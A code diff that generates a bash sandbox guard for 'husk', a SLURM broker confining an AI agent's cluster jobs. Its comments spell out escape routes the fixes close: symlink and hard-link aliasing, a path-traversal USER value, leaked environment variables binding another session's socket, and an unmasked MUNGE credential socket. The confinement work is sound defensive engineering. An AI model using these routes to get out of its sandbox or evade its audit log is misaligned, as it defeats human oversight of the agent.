+    // Only entries whose fallback is EMPTY get the guard: `${SLURM_STEP_ID:-batch}` and the
+    // two `:-0` defaults are deliberate stand-ins, and refusing on them would contradict
+    // the table.
+    //
+    // WHAT THIS REFUSES, ENUMERATED, because the denial is aimed at the OPERATOR and not at
+    // the agent (`P12`; `RA2-7` — the fix that added it named only `%u`, which is the entry
+    // with the smallest blast radius of the four). Every guard emitted below refuses the
+    // whole job when its variable is unset ON THE COMPUTE NODE, and no agent can cause that:
+    //
+    //   %j  SLURM_JOB_ID       — rides 100 % of submissions, because husk's own default is
+    //                            `slurm-%j.out`. If a site ever runs a batch step without
+    //                            it, EVERY brokered job is refused. Widest radius by far,
+    //                            and the reason this list exists.
+    //   %N  SLURMD_NODENAME    — only a pattern that asks for `%N`. Recorded "not
+    //                            independently measured" in the reference test.
+    //   %A  SLURM_ARRAY_JOB_ID — array jobs only, and this is the divergence being fixed;
+    //   %a  SLURM_ARRAY_TASK_ID  on a real array task both are set (measured).
+    //   %u  USER               — only a pattern that asks for `%u`; no tracked pattern does.
+    //
+    // The fail-closed DIRECTION is right — a name husk cannot state is a name husk cannot
+    // check — so the fix for a wrong entry here is a measurement, not a `return 1`. `RA`'s
+    // probe `P2` is where `SLURM_JOB_ID` and `SLURMD_NODENAME` get measured rather than
+    // assumed, which is what `RA-10`'s standing rule requires of any claim about slurmd.
+    //
+    // `RA2-2`/`RA2-3`: the guard checks that a variable is PRESENT, not that it is RIGHT.
+    // The other author of these variables — the broker's own login shell, forwarded by
+    // `--export=ALL` — is removed at the submission boundary instead
+    // (`spool::slurmd_owned_guard_variable`), so what arrives here came from slurmd.
+    let expanders_sh: String = settings::OUTPUT_SPECIFIERS
+        .iter()
+        .map(|spec| {
+            let (c, expansion, var) = (spec.spec(), spec.expansion(), spec.variable());
+            let subst = format!("    _husk_nl=${{_husk_nl//'%{c}'/{expansion}}}");
+            if spec.unset_is_unnameable() {
+                format!(
+                    "    case \"$_husk_nl\" in *'%{c}'*) [ -n \"${{{var}:-}}\" ] || \
+                     {{ _husk_nwhy='%{c} needs {var}, which is not set on this node, so husk \
+                     cannot name the file SLURM will open'; return 0; }} ;; esac\n{subst}"
+                )
+            } else {
+                subst
+            }
+        })
+        .collect::<Vec<_>>()
+        .join("\n");
+    let emitted_check = if out.is_empty() && err.is_empty() {
+        String::new()
+    } else {
+        r#"  # --- husk: the --output/--error paths husk emitted must still be safe (A1-F1) ---
+  _husk_name_bad() {
+    # $1 = the emitted value; may carry SLURM % specifiers in the LEAF only.
+    _husk_nv=$1
+    _husk_nd=${_husk_nv%/*}
+    _husk_nl=${_husk_nv##*/}
+    _husk_nwhy=
+    # The comment above says the leaf is the ONLY place a % may appear, so check it
+    # rather than assume it (RA-9). `readlink -f` would resolve the LITERAL name, which
+    # exists inside the set, and every check below would pass on the wrong directory.
+    case "$_husk_nd" in
+      *%*) _husk_nwhy='its directory holds a % specifier, which husk does not expand, so this is not the directory SLURM will open under'; return 0 ;;
+    esac
+    _husk_nrd=$(readlink -f "$_husk_nd" 2>/dev/null || echo "$_husk_nd")
+    _husk_nin=
+    for _husk_nr in {roots}; do
+      _husk_nrc=$(readlink -f "$_husk_nr" 2>/dev/null || echo "$_husk_nr")
+      case "$_husk_nrd" in "$_husk_nrc"|"$_husk_nrc"/*) _husk_nin=1 ;; esac
+    done
+    # directory resolved OUTSIDE the set -> bad
+    [ -n "$_husk_nin" ] || { _husk_nwhy='its directory resolves outside the writable set'; return 0; }
+    # Expand the specifiers SLURM will, so the leaf can be named and lstat'd. Bash
+    # parameter substitution, no external command and no regex - the guard already
+    # requires bash (it uses arrays), and a sed here is exactly the kind of generated
+    # shell that has shipped literal quotes before.
+    #
+    # These lines are GENERATED from settings::OUTPUT_SPECIFIERS, which is the same table
+    # the submit-time validator accepts from. They were hand-written beside it until B1-1,
+    # and the two drifted by two entries.
+{expanders}
+    case "$_husk_nl" in
+      # FAIL CLOSED. A leaf that still holds a % after every substitution is one husk
+      # cannot name, so it is one husk cannot check - and an unverified path is not a safe
+      # path. This branch used to `return 1` (= not bad) and set _husk_name_unverified,
+      # which the caller consumed on the NEXT iteration and used to skip a genuine
+      # refusal: an unexpandable --output silently disarmed the --error check (B1-1).
+      # There is no excuse variable any more, and no branch that lets a path through
+      # because husk could not look at it.
+      *%*) _husk_nwhy='a % specifier survived expansion, so husk cannot name the file SLURM will open'; return 0 ;;
+      # …and a / in a substituted value does not merely make the leaf unnameable, it
+      # MOVES it: USER=../outside/x with --output=%u.log lands outside the writable
+      # set, past a containment check that already ran on the directory (RA-1).
+      */*) _husk_nwhy='an expanded value contains a /, so the leaf is not in the directory husk confined'; return 0 ;;
+    esac
+    # N1: a symlink leaf is caught, but a HARD LINK is a regular file, so `-h` is false and
+    # the fd check reports the in-set name the fd was opened by, not the inode's other name.
+    # A rank could hard-link the emitted leaf to an inode outside the set and defeat BOTH
+    # checks. husk's leaf is a unique `slurm-%j.out`, so it is created fresh with one link;
+    # a link count above one means the name was pre-planted to alias another path -> bad.
+    _husk_leaf="$_husk_nrd/$_husk_nl"
+    # leaf is a symlink -> bad
+    [ -h "$_husk_leaf" ] && { _husk_nwhy='its final component is a symlink'; return 0; }
+    if [ -e "$_husk_leaf" ]; then
+      _husk_nlinks=$(stat -c %h "$_husk_leaf" 2>/dev/null || echo 1)
+      # a hard link aliasing another path -> bad
+      [ "$_husk_nlinks" -gt 1 ] 2>/dev/null && { _husk_nwhy='its final component has more than one hard link, so it aliases another path'; return 0; }
+    fi
+    return 1
+  }
+  for _husk_np in {out_q} {err_q}; do
+    [ -n "$_husk_np" ] || continue
+    if _husk_name_bad "$_husk_np"; then
+      {
+        echo "husk: ================== JOB REFUSED =================="
+        echo "husk: husk cannot show that an emitted output path is safe on this node:"
+        echo "husk:   $_husk_np"
+        echo "husk:   why  : ${_husk_nwhy:-it could not be verified}"
+        echo "husk: SLURM opens --output/--error as you and OUTSIDE the sandbox, so husk"
+        echo "husk: refuses a path it cannot confine OR cannot name. The body has NOT run,"
+        echo "husk: and --open-mode=append means nothing was truncated."
+        echo "husk: a directory or leaf swapped to a symlink after submission is the case the"
+        echo "husk: submit-time check cannot catch, and is what this guard exists for. an"
+        echo "husk: unexpandable % is refused at SUBMIT time, so meeting one HERE means the"
+        echo "husk: guard and the validator have drifted - report it rather than retrying."
+        echo "husk:   job  : ${SLURM_JOB_ID:-nojob}"
+        echo "husk:   node : $(hostname 2>/dev/null || echo '?')"
+        echo "husk: ================================================="
+      } >>"$_husk_log" 2>/dev/null
+      exit 1
+    fi
+  done
+"#
+        .replace("{expanders}", &expanders_sh)
+        .replace("{roots}", &roots_sh)
+        .replace("{out_q}", &settings::sh_quote(out))
+        .replace("{err_q}", &settings::sh_quote(err))
+    };
+
     let guard = format!(
         "\
 # --- injected by husk-slurm-broker: re-exec once inside the compute-side sandbox ---\n\
+# The agent's script, as DATA. Set before the branch because both halves need it: the\n\
+# in-cage half execs it, the outer half removes it. One origin for the path, so the two\n\
+# cannot drift - the cleanup set has already been wrong once, and every file the guard is\n\
+# responsible for must be named exactly once.\n\
+_husk_body={body_q}\n\
 if [ -z \"${{_HUSK_RESANDBOXED:-}}\" ]; then\n\
   export _HUSK_RESANDBOXED=1\n\
-  exec seccomp-wrapper bwrap {bwrap} -- /bin/bash \"$0\" \"$@\"\n\
+  # EVERY HUSK_ NAME THIS GUARD EXPORTS, CLEARED BEFORE ANYTHING SETS IT. `K-1`.\n\
+  #\n\
+  # `spool.rs` forwards the `HUSK_` prefix from the submitting shell, so each of these\n\
+  # names arrives in the job environment already carrying whatever was in the login\n\
+  # session. `B4-3` was that channel used against the egress pair: with HUSK_NET_SOCK and\n\
+  # HUSK_SOCAT set in the launching shell, a job with NO allowlist reached the step broker\n\
+  # with egress_decided=true and bound another session\'s proxy socket into a rank.\n\
+  #\n\
+  # step.rs answers that by CHECKING the inherited pair against this job. This line answers\n\
+  # it by removing the inheritance: after it, the only writer of these five names is the\n\
+  # guard, so \"the guard builds this once and exports it, so there is a single origin\" is\n\
+  # true by construction rather than by argument (`P2` - the confined side supplies neither\n\
+  # its own boundary nor its own record; the submitting shell is not the confined side, but\n\
+  # it is not husk either). The step-broker check STAYS: it is what makes an in-cage or\n\
+  # nested husk unable to mint a pair, and it is the half that holds if this guard is ever\n\
+  # not the process that starts the step broker.\n\
+  #\n\
+  # HUSK_STEP_SPOOL and HUSK_WRITABLE are here for a reason the finding did not name:\n\
+  # neither is exported on every branch. The guard only exports HUSK_STEP_SPOOL when the\n\
+  # spool is usable, so on the branch where the spool is REFUSED a leaked value survived\n\
+  # into the cage and the in-cage srun stub would have written its requests to a directory\n\
+  # the login shell chose; and HUSK_WRITABLE is what the banner tells the agent it may\n\
+  # write, so an inherited one is a LOGIN session\'s answer to a COMPUTE question. Same\n\
+  # channel, three variables over (`fix the sibling in the same pass`).\n\
+  #\n\
+  # `every_husk_name_the_guard_exports_is_cleared_first` reads the emitted script and fails\n\
+  # if a fifth name is exported without joining this line - an enumeration that asserts\n\
+  # itself rather than a comment asking to be maintained (`P8`).\n\
+  unset HUSK_NET_SOCK HUSK_SOCAT HUSK_STEP_SPOOL HUSK_JOB_LOG HUSK_WRITABLE\n\
+  # An ARRAY, not a string. A string of pre-quoted arguments expanded unquoted gets\n\
+  # word-split but NOT quote-removed, so bwrap would receive a path with literal quotes\n\
+  # in it - which is exactly how the srun bind below took every job down once.\n\
+  #\n\
+  # THE MUNGE MASK, AND IT REFUSES ON THE SAME INPUT THE RANK REFUSES ON (`K-2`).\n\
+  # profile.rs names this mount as the load-bearing control for the only shipped profile,\n\
+  # and it is enforced in TWO places - here for the job cage, and rank.rs for each rank,\n\
+  # because bwrap mount namespaces do not propagate. Fix K made the rank refuse when the\n\
+  # mask cannot be applied and left this half at a bare `[ -d ] || continue`, so the SAME\n\
+  # node configuration produced a refusal there and a silently unmasked job cage here. Two\n\
+  # enforcers of one control, giving opposite answers, and the operator meets the confusing\n\
+  # half first: a job that runs (with the real /run/munge visible to the body - AV8) until\n\
+  # it calls srun.\n\
+  #\n\
+  # So: same split as rank.rs. ABSENT is not a failure and must stay a silent skip - there\n\
+  # is no credential socket to hide and `--tmpfs` on an absent DEST is what took the whole\n\
+  # cage down twice. PRESENT-BUT-UNMASKABLE is a failure of the control, and the job does\n\
+  # not start.\n\
+  #\n\
+  # WHERE THE TWO LEGITIMATELY DIFFER, and why this half does not simply copy that one: a\n\
+  # path resolving through WHITESPACE is unmaskable in a rank (it builds `$_m` by string\n\
+  # concatenation and expands it unquoted) and perfectly maskable here (`_husk_extra` is a\n\
+  # bash array, so one word stays one word - measured). Refusing here would be husk denying\n\
+  # a job whose cage it can actually build, which is the operator-aimed denial of service\n\
+  # this round shipped three times. It ANNOUNCES instead: the job is caged, and every srun\n\
+  # in it will refuse, said once at job start rather than discovered per rank (`P13`).\n\
+  _husk_extra=()\n\
+  _husk_seen=\n\
+  _husk_mwhy=\n\
+  _husk_mspace=\n\
+  for _d in {mask_paths}; do\n\
+    if [ ! -d \"$_d\" ]; then\n\
+      [ -e \"$_d\" ] || continue\n\
+      _husk_mwhy=\"$_d exists but is not a directory, so a tmpfs cannot be mounted over it\"\n\
+      break\n\
+    fi\n\
+    _r=$(readlink -f \"$_d\" 2>/dev/null || echo \"$_d\")\n\
+    case \"$_r\" in\n\
+      \"\")\n\
+        _husk_mwhy=\"$_d resolves to an empty path, so husk has no name to mount over\"\n\
+        break\n\
+        ;;\n\
+      *[[:space:]]*) [ -n \"$_husk_mspace\" ] || _husk_mspace=\"$_d -> $_r\" ;;\n\
+    esac\n\
+    case \" $_husk_seen \" in *\" $_r \"*) continue ;; esac\n\
+    _husk_seen=\"$_husk_seen $_r\"\n\
+    _husk_extra+=(--tmpfs \"$_r\")\n\
+  done\n\
+  if [ -n \"$_husk_mwhy\" ]; then\n\
+    echo \"husk: cannot mask this node\'s credential socket directory - $_husk_mwhy.\" >&2\n\
+    echo \"husk: Refusing to run this job. That mask is what keeps the MUNGE socket\" >&2\n\
+    echo \"husk: out of the cage, and without it a job can authenticate to SLURM and\" >&2\n\
+    echo \"husk: submit work husk never sees. Nothing your job did causes this - it is\" >&2\n\
+    echo \"husk: how this node is configured, so report the path above to your site.\" >&2\n\
+    echo \"husk: The body has NOT run.\" >&2\n\
+    exit 1\n\
+  fi\n\
+  if [ -n \"$_husk_mspace\" ]; then\n\
+    echo \"husk: this node\'s credential socket directory resolves through whitespace:\" >&2\n\
+    echo \"husk:   $_husk_mspace\" >&2\n\
+    echo \"husk: the job cage masks it correctly, so THIS job is confined - but every\" >&2\n\
+    echo \"husk: srun step in it will refuse to start, because a rank cannot pass that\" >&2\n\
+    echo \"husk: path to bwrap as one word. Nothing your job did causes this; report the\" >&2\n\
+    echo \"husk: path above to your site.\" >&2\n\
+  fi\n\
+  # Bootstrap the step pair: an UN-CAGED step-broker (it needs MUNGE and the daemon\n\
+  # route, which is exactly what the cage removes) plus the in-cage srun stub bound over\n\
+  # the real srun. Everything is conditional on the pieces existing HERE, on this node:\n\
+  # the broker resolved these paths on the login node, and a bwrap bind whose source is\n\
+  # missing kills the cage outright. If any of it is absent the job still runs - srun\n\
+  # simply is not brokered, and fails in the cage for want of a route, which is the\n\
+  # status quo. The stub is convenience, not containment.\n\
+  # The job spool. Hoisted OUT of the step-pair block below: it holds the step spool AND\n\
+  # the egress socket, and a job with no srun stub must still be able to have a network.\n\
+  # Coupling egress to the stub would have made an inactive step pair silently mean no\n\
+  # network either.\n\
+  # ONE definition of \"is this still the directory husk made?\", used at EVERY place in this\n\
+  # guard that deletes inside a directory whose PARENT somebody else can write. It existed\n\
+  # once, inline on /dev/shm, under a comment naming \"a deletion primitive\" - and the step\n\
+  # spool, whose parent is the workdir the cage binds WRITABLE, never got it (`RDF-D-1`).\n\
+  #\n\
+  # `mkdir -p` over a SYMLINK TO A DIRECTORY returns 0. `[ -d ]` follows it. `rm -f`'s globs\n\
+  # resolve through it. So the confined side points this name at any directory the user can\n\
+  # write, and husk's own cleanup deletes `out-*`, `err-*` and `.*.tmp` there, as the real\n\
+  # user, OUTSIDE the cage - then echoes `ls -A` of it to the job's stderr, which is a file\n\
+  # the agent reads. No race is needed. `P15`: a control names a target; check that the name\n\
+  # resolves to the object you meant.\n\
+  _husk_ours() {{\n\
+    [ -d \"$1\" ] && [ ! -L \"$1\" ] && [ -O \"$1\" ]\n\
+  }}\n\
+  _husk_spool={workdir_q}\"/.husk-step-spool-${{SLURM_JOB_ID:-nojob}}\"\n\
+  mkdir -p \"$_husk_spool\" 2>/dev/null\n\
+  if _husk_ours \"$_husk_spool\"; then\n\
+    :\n\
+  elif [ -e \"$_husk_spool\" ] || [ -L \"$_husk_spool\" ]; then\n\
+    # CHECKED AT CREATION, not only at cleanup. The step-broker runs UNCAGED and writes\n\
+    # out-<id>/err-<id> - files whose CONTENT is the step's own output - into this\n\
+    # directory, so a name pre-planted before the job started is an out-of-cage WRITE\n\
+    # primitive as well as a delete one. Refusing costs this job its srun brokering and\n\
+    # nothing else: the spool is not on the egress path (the socket moved to node-local\n\
+    # /tmp), the body still runs, and an unusable spool has always meant exactly this.\n\
+    echo \"husk: NOT using $_husk_spool as this job's step spool - something is already\" >&2\n\
+    echo \"husk: at that name, and it is a symlink or not a directory you own. husk creates\" >&2\n\
+    echo \"husk: this directory itself and will not write into, or delete inside, a name\" >&2\n\
+    echo \"husk: something else chose. srun is NOT brokered in this job; the job still runs.\" >&2\n\
+    echo \"husk: Remove or rename that path and resubmit.\" >&2\n\
+    _husk_spool=\n\
+  else\n\
+    # This used to be a bare `|| _husk_spool=`, and it was SILENT: with the stub, the broker\n\
+    # and srun all present, the step-pair block's `else` never fires, so a job whose spool\n\
+    # could not be created got no step broker, no bound stub and NO MESSAGE on any channel\n\
+    # (`P7`).\n\
+    echo \"husk: could not create $_husk_spool, so srun is NOT brokered in this job. The\" >&2\n\
+    echo \"husk: job still runs; a real srun inside the cage will fail for want of a route.\" >&2\n\
+    _husk_spool=\n\
+  fi\n\
+  # Hoisted with the spool, and for the same reason: BOTH the egress proxy and the\n\
+  # step-broker are started from it, and the proxy now starts first. Leaving this in the\n\
+  # step-pair block below made the proxy line expand to an EMPTY command - the guard said\n\
+  # only \"line 43: : command not found\", no proxy ever ran, and three network arms failed\n\
+  # for a reason none of them could see (Balfrin 4987657).\n\
+  _husk_broker={broker_q}\n\
+  # Where husk's own record of this job goes, and it is deliberately NOT the spool.\n\
+  # The spool sits inside the workdir, which the cage binds WRITABLE, so a log kept there\n\
+  # is one the job can truncate, rewrite or plant lines in - the audited party must not be\n\
+  # able to author the audit trail. $HOME is tmpfs-masked inside the cage, so this file is\n\
+  # out of the job's reach entirely; it is read from the login node, where husk was\n\
+  # launched. One file per job, named by job id, so there is no question which run it is.\n\
+  #\n\
+  # The step-broker and the egress proxy BOTH append here. They are two trusted processes\n\
+  # with one story to tell about one job, they prefix their lines distinctly, and one place\n\
+  # to look beats two.\n\
+  _husk_log=/dev/stderr\n\
+  if [ -n \"${{HOME:-}}\" ] && mkdir -p \"$HOME/.husk/log\" 2>/dev/null; then\n\
+    _husk_log=\"$HOME/.husk/log/job-${{SLURM_JOB_ID:-nojob}}.log\"\n\
+    echo \"husk: job ${{SLURM_JOB_ID:-nojob}} on $(hostname 2>/dev/null || echo '?') \
+started $(date -u +%Y%m%d-%H%M%SZ 2>/dev/null) in {workdir_q}\" \\\n\
+      >>\"$_husk_log\" 2>/dev/null || _husk_log=/dev/stderr\n\
+  fi\n\
+  if [ \"$_husk_log\" = /dev/stderr ]; then\n\
+    # Logging is diagnostics, not the boundary, so a home it cannot write must never abort\n\
+    # a job. Merge into the job's stderr and SAY the record is no longer out of reach.\n\
+    echo \"husk: $HOME/.husk/log is not writable from this node, so husk's log for this\" >&2\n\
+    echo \"husk: job is merged into the job's own stderr instead of kept outside it.\" >&2\n\
+  fi\n\
+  export HUSK_JOB_LOG=\"$_husk_log\"\n\
+{fd_guard}{emitted_check}\
+{net_start}  _husk_step_pid=\n\
+  _husk_stub={stub_q}\n\
+  _husk_real_srun=$(command -v srun 2>/dev/null || true)\n\
+  if [ -r \"$_husk_stub\" ] && [ -x \"$_husk_broker\" ] && [ -n \"$_husk_real_srun\" ]; then\n\
+    if [ -n \"$_husk_spool\" ]; then\n\
+      export HUSK_STEP_SPOOL=\"$_husk_spool\"\n\
+      \"$_husk_broker\" --step-broker --spool \"$_husk_spool\" --workdir {workdir_q} \\\n\
+        >>\"$_husk_log\" 2>&1 &\n\
+      _husk_step_pid=$!\n\
+      # CONFIRM IT CAME UP. The step broker fails CLOSED on settings it cannot parse and\n\
+      # exits(2) - which is correct. But it was started in the background and nothing ever\n\
+      # checked, so that exit was invisible: the stub still got bound over srun, every srun\n\
+      # wrote a request no one would ever answer, and the job hung to its walltime with no\n\
+      # output on any channel anyone was reading. The reason sat in husk's own job log, two\n\
+      # clear sentences, where neither the agent nor the operator was looking.\n\
+      #\n\
+      # That is not fail-closed. It is fail-silent, and it is the worst shape available: the\n\
+      # safe decision was taken and then hidden. It cost an afternoon of ghost-hunting across\n\
+      # four nodes and four rank counts (2026-08-06), and the trigger was a human saving an\n\
+      # empty .claude/settings.json in vim - about as ordinary as a mistake gets.\n\
+      #\n\
+      # Settings resolution happens before the watch loop, so a broker that is gone by now\n\
+      # refused to start. `kill -0` is NOT enough: bash has not reaped it, so a dead child is\n\
+      # a zombie and `kill -0` succeeds. Read the actual state instead.\n\
+      sleep 1\n\
+      _husk_step_state=$(sed -n 's/^State:[[:space:]]*\\([A-Z]\\).*/\\1/p' \\\n\
+        \"/proc/$_husk_step_pid/status\" 2>/dev/null)\n\
+      case \"${{_husk_step_state:-gone}}\" in\n\
+        Z|gone)\n\
+          echo \"husk: the step broker refused to start, so srun cannot work in this job.\" >&2\n\
+          echo \"husk: failing the job now, rather than letting every srun hang silently\" >&2\n\
+          echo \"husk: until the walltime expires. The reason it refused:\" >&2\n\
+          if [ -f \"$_husk_log\" ]; then\n\
+            sed -n 's/^husk: /husk:     /p' \"$_husk_log\" 2>/dev/null | tail -n 4 >&2\n\
+          else\n\
+            echo \"husk:     (see the step broker's output above)\" >&2\n\
+          fi\n\
+          exit 1\n\
+          ;;\n\
+      esac\n\
+      _husk_extra+=(--ro-bind \"$_husk_stub\" \"$_husk_real_srun\")\n\
+    fi\n\
+  else\n\
+    # SAY SO. Continuing is the right call - the stub is convenience, not containment -\n\
+    # but doing it silently means a job where srun is NOT brokered looks exactly like one\n\
+    # where it is, until srun fails inside the cage with a scheduler error about an\n\
+    # expired allocation. That is what a real srun does with MUNGE masked and no route,\n\
+    # and diagnosing it from the message alone costs a bring-up round (2026-07-31).\n\
+    echo \"husk: srun is NOT brokered in this job - the step pair is inactive\" >&2\n\
+    echo \"husk:   stub=$_husk_stub\" >&2\n\
+    echo \"husk:   broker=$_husk_broker\" >&2\n\
+    echo \"husk:   srun=${{_husk_real_srun:-<not found on this node>}}\" >&2\n\
+    echo \"husk:   a real srun in the cage cannot reach slurmctld; run husk from its\" >&2\n\
+    echo \"husk:   installed prefix so <prefix>/lib/husk/srun-stub.py resolves\" >&2\n\
+  fi\n\
+  # Catch the signal SLURM ends a job with, for TWO reasons.\n\
+  #\n\
+  # 1. Without a trap an untrapped SIGTERM kills this shell outright, so NONE of the\n\
+  #    cleanup below runs - the step-broker, the proxy, the socket dir and the step spool\n\
+  #    all leak on every preempted job. bash defers a trap until the foreground command\n\
+  #    finishes, and that command has been signalled too, so the handler runs right after\n\
+  #    the cage exits and the normal path continues.\n\
+  # 2. It is how the job learns its output is PARTIAL. See the message below.\n\
+  _husk_signalled=\n\
+  trap '_husk_signalled=SIGTERM' TERM\n\
+  trap '_husk_signalled=SIGINT' INT\n\
+{reclaim_pre}\
+  seccomp-wrapper --profile={sec} bwrap {bwrap} ${{_husk_extra[@]+\"${{_husk_extra[@]}}\"}} -- /bin/bash \"$0\" \"$@\"\n\
+  _husk_rc=$?\n\
+{reclaim_post}\
+  # The step-broker holds the credentials the job must not have, so it dies WITH the job.\n\
+  # It also sets PR_SET_PDEATHSIG, so this is the belt to that pair of braces.\n\
+  [ -n \"$_husk_step_pid\" ] && kill \"$_husk_step_pid\" 2>/dev/null\n\
+  # The egress proxy holds the one route out of this job, so it dies WITH the job for the\n\
+  # same reason the step-broker does. It sets PR_SET_PDEATHSIG too; this is the belt.\n\
+  [ -n \"${{_husk_net_pid:-}}\" ] && kill \"$_husk_net_pid\" 2>/dev/null\n\
+  # --- husk: cleanup ---\n\
+  # ...and the node-local directory its socket lived in. Same rule as the step spool:\n\
+  # by name, then rmdir, so anything else in there keeps the directory instead of being\n\
+  # deleted. /tmp is node-local, so this is the only chance to clean it up.\n\
+  if [ -n \"${{_husk_net_dir:-}}\" ] && _husk_ours \"$_husk_net_dir\"; then\n\
+    rm -f \"$_husk_net_dir/net.sock\" 2>/dev/null\n\
+    rmdir \"$_husk_net_dir\" 2>/dev/null\n\
+  fi\n\
+  # --- husk: remove the step spool ---\n\
+  # Per-JOB and worthless the moment the job ends, but it is created in the user's working\n\
+  # directory, so one left behind per job turns an active project into a litter tray. It is\n\
+  # now unconditional: the record worth keeping is $_husk_log, which is not in here.\n\
+  #\n\
+  # Removed by name and then rmdir, never `rm -rf`: this runs with the user's rights in a\n\
+  # directory the JOB can write, so a recursive delete would be a deletion primitive aimed\n\
+  # at whatever else ended up there. Anything unrecognised makes rmdir fail, the directory\n\
+  # survives, and we say so - the safe outcome, out loud rather than silently.\n\
+  #\n\
+  # This list must cover every file the guard creates in the spool. When egress was added\n\
+  # it did not: net.sock, socat and net-proxy.log were never removed, so rmdir failed and\n\
+  # EVERY networked job leaked its spool, silently, because the failure had no branch that\n\
+  # reported it. A test now derives the required names from the generated script.\n\
+  # THE STAGED BODY IS NOT DELETED HERE, and that is the fix for a real defect.\n\
+  #\n\
+  # This used to say the body was owned by the guard - it must outlive submission but not\n\
+  # outlive the job - and then rm -f it. The job is not the TASK. One submission\n\
+  # is N array tasks, so N guards each reclaim the shared script: an --array=1-27 %6 run had\n\
+  # tasks 1-6 succeed and 7-27 fail identically with No such file or directory, because the\n\
+  # first wave finished and deleted what the rest were still going to read (2026-08-09).\n\
+  # A REQUEUED job hits the same thing, and husk forces the preemptible partition, so that is\n\
+  # the normal case rather than an edge one.\n\
+  #\n\
+  # The guard is simply the wrong owner: a per-task actor cannot release a per-submission\n\
+  # resource, because nothing here knows whether another task is still queued. Ownership is\n\
+  # the session's now, age-based, at the next husk start (see `bodies_to_prune`).\n\
+  # The per-job /dev/shm directory the ranks create and share. It had no owner and no\n\
+  # release on ANY path, not even the clean one: a step exited 0 and the directory stayed,\n\
+  # RAM-backed, holding whatever MPI segments were in it, until something else on the node\n\
+  # happened to clear it. rmdir, not rm -rf: this is /dev/shm, it is shared with every\n\
+  # other user, and a recursive delete pointed at a path someone else may have created\n\
+  # first is a deletion primitive. If it is not empty we leave it and say so.\n\
+  _husk_shm=\"/dev/shm/husk-${{SLURM_JOB_ID:-nojob}}\"\n\
+  if _husk_ours \"$_husk_shm\"; then\n\
+    rm -f \"$_husk_shm\"/* 2>/dev/null\n\
+    rmdir \"$_husk_shm\" 2>/dev/null \\\n\
+      || echo \"husk: kept $_husk_shm - it is not empty\" >>\"$_husk_log\" 2>/dev/null\n\
+  fi\n\
+  if [ -z \"$_husk_spool\" ]; then\n\
+    # UNCONDITIONAL, and this is why: a job left a step spool behind with NO message\n\
+    # anywhere, and the directory mtime proved this block had never run. Silence made\n\
+    # \"did not execute\" and \"executed and failed\" indistinguishable, which cost a round\n\
+    # of guessing. Every path through the cleanup says what it did.\n\
+    echo \"husk: no step spool to clean (spool=<empty>)\" >>\"$_husk_log\" 2>/dev/null\n\
+  elif _husk_ours \"$_husk_spool\"; then\n\
+    # NOTE THE SHAPE: this line NAMES what it removes, so every artifact anyone adds to\n\
+    # the spool must be added here too, or the rmdir below fails and the whole spool leaks.\n\
+    # A cleanup that enumerates is a denylist. It cost three selftest failures the day the\n\
+    # broker heartbeat arrived (2026-08-06), caught on hardware by the arm that exists for\n\
+    # exactly this.\n\
+    #\n\
+    # GENERATED - every glob of it - from step::step_spool_globs(), so the shell cannot\n\
+    # drift from the Rust, and a test writes one file per glob and RUNS this block to prove\n\
+    # each glob works. It used to be two hand-written rm lines whose comment claimed they\n\
+    # covered \"the write-and-rename temp\": true of the heartbeat's, which is deliberately\n\
+    # named as a suffix of it, and false of the OTHER write-and-rename in this same\n\
+    # directory. write_atomic names its temp with a LEADING DOT, no glob here began with\n\
+    # one, and a shell glob does not match a leading dot - so one interrupted step response\n\
+    # left .resp-<id>.json.tmp, the rmdir failed, and the job reported \"it still holds\"\n\
+    # about a file husk had written itself.\n\
+    rm -f {step_spool_rm} 2>/dev/null\n\
+    if rmdir \"$_husk_spool\" 2>/dev/null; then\n\
+      echo \"husk: step spool removed\" >>\"$_husk_log\" 2>/dev/null\n\
+    else\n\
+      _husk_left=$(ls -A \"$_husk_spool\" 2>/dev/null | tr '\\n' ' ')\n\
+      echo \"husk: kept $_husk_spool - it still holds: $_husk_left\" >&2\n\
+      echo \"husk: kept $_husk_spool - it still holds: $_husk_left\" >>\"$_husk_log\" 2>/dev/null\n\
+    fi\n\
+  elif [ ! -e \"$_husk_spool\" ] && [ ! -L \"$_husk_spool\" ]; then\n\
+    echo \"husk: no step spool to clean ($_husk_spool is already gone)\" >>\"$_husk_log\" 2>/dev/null\n\
+  else\n\
+    # REFUSED, and note what is NOT here: no `rm`, and no `ls -A`. Both halves of `RDF-D-1`\n\
+    # were in this branch's predecessor - the deletion AND the listing of the target echoed\n\
+    # onto the job's stderr, which lands in `--output`, which the agent reads. A cleanup\n\
+    # that cannot prove what it is standing in tells you the name and nothing about the\n\
+    # contents (`P2`: the confined side supplies neither its own boundary nor its own\n\
+    # record).\n\
+    #\n\
+    # This is a leaked directory, never a failed job: the body has already run and exited.\n\
+    echo \"husk: NOT cleaning $_husk_spool - it is no longer a directory husk owns (a\" >&2\n\
+    echo \"husk: symlink, or owned by somebody else). husk removes files BY NAME inside a\" >&2\n\
+    echo \"husk: directory it created; it will not follow a name that now points somewhere\" >&2\n\
+    echo \"husk: else, so nothing was deleted and nothing there was listed. The path is\" >&2\n\
+    echo \"husk: yours to remove.\" >&2\n\
+    echo \"husk: NOT cleaning $_husk_spool - not a directory husk owns; nothing deleted\" \\\n\
+      >>\"$_husk_log\" 2>/dev/null\n\
+  fi\n\
+  # PARTIAL OUTPUT IS THE FAILURE MODE THAT MATTERS HERE.\n\
+  #\n\
+  # husk forces every job onto one partition, and on a preemptible one any job from any\n\
+  # other partition interrupts it - that is exactly what keeps an agent from ever blocking\n\
+  # the machine. The cost of that cheap guarantee is this: an interrupted run leaves output\n\
+  # behind. A model that does not checkpoint (ICON with lrestart = .FALSE.) leaves a\n\
+  # directory that looks much like a finished run, and an agent reading it can report that\n\
+  # the science ran. For a weather service that is a worse outcome than an escape.\n\
+  #\n\
+  # So say it, unmissably, in BOTH places someone looks: the job's own stderr and husk's\n\
+  # job log. The exit status already differs (143), but the thing at risk is a reader\n\
+  # looking at the OUTPUT DIRECTORY, who never sees an exit status.\n\
+  #\n\
+  # Deliberately NOT claiming \"preempted\": SLURM sends SIGTERM for preemption, for a\n\
+  # wall-clock limit and for scancel alike, and they are indistinguishable from in here.\n\
+  # Naming the wrong cause confidently is the mistake husk keeps having to fix - so state\n\
+  # the fact (it ended early) and the consequence (the output is incomplete), which hold\n\
+  # whichever it was.\n\
+  if [ -n \"$_husk_signalled\" ] || [ \"$_husk_rc\" = 143 ] || [ \"$_husk_rc\" = 137 ]; then\n\
+    {{\n\
+      echo \"husk: ==========================================================\"\n\
